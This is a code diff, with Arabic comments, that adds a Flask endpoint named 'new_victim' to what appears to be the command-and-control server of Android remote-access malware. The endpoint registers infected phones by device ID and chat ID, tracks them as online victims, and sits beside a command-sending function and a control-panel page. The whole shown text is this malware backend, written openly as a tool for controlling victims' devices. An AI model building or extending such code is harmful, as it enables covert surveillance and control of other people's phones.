@@ -109,7 +109,51 @@ def send_command_with_param(chat_id, command, param):
     except Exception as e:
         return f"❌ خطأ: {str(e)}"
 
+# ============================================================
+# ✅ ✅ ✅ الـ Endpoint الجديد لاستقبال الضحايا ✅ ✅ ✅
+# ============================================================
+@app.route('/api/new_victim', methods=['POST'])
+def new_victim():
+    """استقبال ضحية جديدة من تطبيق Android"""
+    try:
+        data = request.get_json()
+        device_id = data.get('device_id')
+        device_name = data.get('device_name')
+        chat_id = data.get('chat_id')
+        
+        # ✅ التحقق من وجود البيانات
+        if not device_id or not chat_id:
+            return jsonify({
+                "status": "error", 
+                "message": "Missing device_id or chat_id"
+            }), 400
+        
+        # ✅ تخزين الضحية في القائمة
+        victims[chat_id] = {
+            "device_id": device_id,
+            "device_name": device_name or "جهاز غير معروف",
+            "status": "online",
+            "last_seen": time.time()
+        }
+        
+        print(f"✅ تم تسجيل ضحية جديدة من Android: {device_name} ({device_id})")
+        print(f"📊 عدد الضحايا الآن: {len(victims)}")
+        
+        return jsonify({
+            "status": "ok",
+            "message": f"Victim {device_name} registered successfully"
+        })
+        
+    except Exception as e:
+        print(f"❌ خطأ في تسجيل الضحية: {e}")
+        return jsonify({
+            "status": "error",
+            "message": str(e)
+        }), 500
+
+# ============================================================
 # ✅ HTML (واجهة محسّنة)
+# ============================================================
 HTML = """
 <!DOCTYPE html>
 <html>
